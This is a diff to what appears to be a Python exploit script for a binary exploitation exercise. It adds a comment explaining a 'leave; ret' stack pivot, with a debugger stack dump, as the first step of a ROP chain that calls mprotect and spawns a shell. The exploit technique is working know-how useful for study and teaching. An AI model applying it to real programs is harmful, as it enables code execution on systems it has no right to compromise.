@@ -16,7 +16,34 @@ def p(x):
     return struct.pack('<L', x)
 
 payload = ""
-payload += p(0x80483e8)
+''' do leave; ret to restore the stack to our payload
+ if we don't do a leave; ret, the stack is still the legit stack
+ of the program filled with
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd4b0 --> 0x20000000 --> 0x0
+0004| 0xffffd4b4 --> 0x400
+0008| 0xffffd4b8 --> 0x1
+0012| 0xffffd4bc --> 0x22 ('"')
+0016| 0xffffd4c0 --> 0xffffffff
+0020| 0xffffd4c4 --> 0x0
+0024| 0xffffd4c8 --> 0xffffd58c --> 0xffffd713 ("XDG_VTNR=1")
+0028| 0xffffd4cc --> 0xf7e4842d (<__cxa_atexit+29>:     test   eax,eax)
+
+which won't be useful to us because we need to get args for the mprotect()
+system call onto the stack
+
+ebp helpfully points to the payload we have injected
+we exec leave (mov esp, ebp; pop ebp)
+which will put the payload into esp, then add esp,4
+leaving us with ESP pointing to <mprotect> and our args to mprotect
+on the stack
+
+tl;dr the leave puts our payload on the stack. We now have full control
+over the stack and where we are going with RET, so we can execute our
+ROP chain to spawn a shell
+
+'''
+payload += p(0x80483e8) # leave; ret
 payload += "A"*12 # dummy
 
 # make memory section rwx
